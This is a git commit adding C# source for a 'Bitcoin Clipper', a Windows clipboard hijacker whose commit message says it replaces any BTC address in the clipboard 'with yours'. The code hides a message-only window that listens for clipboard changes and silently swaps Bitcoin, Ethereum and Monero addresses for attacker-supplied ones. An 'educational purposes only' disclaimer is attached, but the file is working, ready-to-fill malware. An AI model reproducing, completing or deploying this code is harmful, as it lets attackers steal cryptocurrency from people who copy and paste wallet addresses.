c61398ad643e9b3ad2ab7136a72c9740da2ebe9a
Project AM <asril.m@hotmail.com>
2020-10-08 14:15:52 +0800

    ғᴏʀ ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ ᴘᴜʀᴘᴏsᴇs ᴏɴʟʏ
    Replace any BTC address in clipboard with yours bruh

---
+++ Form1.Designer.cs
@@ -0,0 +1,131 @@
+﻿namespace Bitcoin_Clipper
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.panel1 = new System.Windows.Forms.Panel();
+            this.label1 = new System.Windows.Forms.Label();
+            this.panel2 = new System.Windows.Forms.Panel();
+            this.button1 = new System.Windows.Forms.Button();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.panel1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // panel1
+            // 
+            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(58)))), ((int)(((byte)(61)))));
+            this.panel1.Controls.Add(this.label1);
+            this.panel1.Controls.Add(this.panel2);
+            this.panel1.Location = new System.Drawing.Point(28, 66);
+            this.panel1.Name = "panel1";
+            this.panel1.Size = new System.Drawing.Size(342, 40);
+            this.panel1.TabIndex = 0;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Segoe UI", 10F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.Location = new System.Drawing.Point(24, 9);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(188, 19);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "Paste Your Address Bitcoin";
+            // 
+            // panel2
+            // 
+            this.panel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(225)))), ((int)(((byte)(149)))), ((int)(((byte)(21)))));
+            this.panel2.Dock = System.Windows.Forms.DockStyle.Left;
+            this.panel2.Location = new System.Drawing.Point(0, 0);
+            this.panel2.Name = "panel2";
+            this.panel2.Size = new System.Drawing.Size(11, 40);
+            this.panel2.TabIndex = 0;
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(217)))), ((int)(((byte)(158)))));
+            this.button1.FlatAppearance.BorderSize = 0;
+            this.button1.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(225)))), ((int)(((byte)(149)))), ((int)(((byte)(21)))));
+            this.button1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(225)))), ((int)(((byte)(149)))), ((int)(((byte)(21)))));
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Font = new System.Drawing.Font("Segoe UI", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.Location = new System.Drawing.Point(159, 174);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(92, 33);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "Build";
+            this.button1.UseVisualStyleBackColor = false;
+            // 
+            // textBox1
+            // 
+            this.textBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(58)))), ((int)(((byte)(61)))));
+            this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.textBox1.Font = new System.Drawing.Font("Segoe UI", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.textBox1.ForeColor = System.Drawing.SystemColors.ScrollBar;
+            this.textBox1.Location = new System.Drawing.Point(28, 123);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(342, 18);
+            this.textBox1.TabIndex = 2;
+            this.textBox1.Text = "-- paste here --";
+            this.textBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(48)))), ((int)(((byte)(49)))), ((int)(((byte)(53)))));
+            this.ClientSize = new System.Drawing.Size(402, 236);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.panel1);
+            this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.ForeColor = System.Drawing.SystemColors.ButtonHighlight;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Bitcoin Clipper";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.panel1.ResumeLayout(false);
+            this.panel1.PerformLayout();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Panel panel1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Panel panel2;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.TextBox textBox1;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,157 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Text.RegularExpressions;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+
+
+/*
+ * │ Author       : Project AM
+ * │ Youtube      : https://www.youtube.com/channel/UCwI8AQlBewsdxbyk2r4n9CQ/videos?view_as=subscriber
+ * │ Contact      : https://github.com/am-523/
+ * 
+ * This program Is distributed for educational purposes only.
+ */
+
+namespace Bitcoin_Clipper
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+      
+        public static void Run()
+        {
+            Application.Run(new ClipboardNotification.NotificationForm());
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            new Thread(() => { Run(); }).Start();
+        }
+    }
+
+    internal static class Addresses
+    {
+        public readonly static string btc = "123abcedede"; //you btc address
+        public readonly static string ethereum = "Ethereum"; //youeth address
+        public readonly static string xmr = "XMR"; //you xmr address
+    }
+
+    internal static class PatternRegex
+    {
+        public readonly static Regex btc = new Regex(@"\b(bced1|[15])[a-z6A-H6J-NP6-Z06-96]{26,35}\b");
+        public readonly static Regex ethereum = new Regex(@"\b0x[a-fA-F0-9]{40}\b");
+        public readonly static Regex xmr = new Regex(@"\b4([0-9]|[A-B])(.){93}\b");
+    }
+
+    internal static class NativeMethods
+    {
+        public const int WM_CLIPBOARDUPDATE = 0x031D;
+        public static IntPtr HWND_MESSAGE = new IntPtr(-3);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool AddClipboardFormatListener(IntPtr hwnd);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
+    }
+
+    internal static class Clipboard
+    {
+        public static string GetText()
+        {
+            string ReturnValue = string.Empty;
+            Thread STAThread = new Thread(
+                delegate ()
+                {
+                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
+                });
+            STAThread.SetApartmentState(ApartmentState.STA);
+            STAThread.Start();
+            STAThread.Join();
+
+            return ReturnValue;
+        }
+
+        public static void SetText(string txt)
+        {
+            Thread STAThread = new Thread(
+                delegate ()
+                {
+                    System.Windows.Forms.Clipboard.SetText(txt);
+                });
+            STAThread.SetApartmentState(ApartmentState.STA);
+            STAThread.Start();
+            STAThread.Join();
+        }
+    }
+
+    public sealed class ClipboardNotification
+    {
+        public class NotificationForm : Form
+        {
+            private static string currentClipboard = Clipboard.GetText();
+            public NotificationForm()
+            {
+                NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
+                NativeMethods.AddClipboardFormatListener(Handle);
+            }
+
+            private bool RegexResult(Regex pattern)
+            {
+                if (pattern.Match(currentClipboard).Success) return true;
+                else
+                    return false;
+            }
+
+            protected override void WndProc(ref Message m)
+            {
+                if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
+                {
+                    currentClipboard = Clipboard.GetText();
+
+                    if (RegexResult(PatternRegex.btc) && !currentClipboard.Contains(Addresses.btc))
+                    {
+                        string result = PatternRegex.btc.Replace(currentClipboard, Addresses.btc);
+                        Clipboard.SetText(result);
+                    }
+
+                    if (RegexResult(PatternRegex.ethereum) && !currentClipboard.Contains(Addresses.ethereum))
+                    {
+                        string result = PatternRegex.ethereum.Replace(currentClipboard, Addresses.ethereum);
+                        Clipboard.SetText(result);
+                    }
+
+                    if (RegexResult(PatternRegex.xmr) && !currentClipboard.Contains(Addresses.xmr))
+                    {
+                        string result = PatternRegex.xmr.Replace(currentClipboard, Addresses.xmr);
+                        Clipboard.SetText(result);
+                    }
+
+                }
+                base.WndProc(ref m);
+            }
+
+
+
+            private void button1_Click(object sender, EventArgs e)
+            {
+
+            }
+
+
+        }
+    }
+}
